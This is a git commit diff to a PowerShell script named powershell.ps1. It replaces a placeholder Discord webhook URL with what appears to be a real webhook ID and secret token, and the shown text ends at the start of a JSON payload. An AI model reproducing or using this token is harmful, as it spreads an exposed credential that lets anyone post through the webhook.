82198b053053b51af0dfcc2eeb88b2de678e3fb7
Sahdude27 <68794099+Sahdude27@users.noreply.github.com>
2024-05-07 00:20:28 -0400

    Update powershell.ps1

--- powershell.ps1
+++ powershell.ps1
@@ -1,5 +1,5 @@
 # Discord webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
+$webhookUrl = "https://discord.com/api/webhooks/1149830168903438358/9Doq-cehv0fkinqLVAg3wrGdtpNqCs0j8rM_OEuh1PQn6B8EstGbTZF8QGwsyT4sqVxS"
 
 # JSON payload to send to the webhook
 $jsonPayload = @{
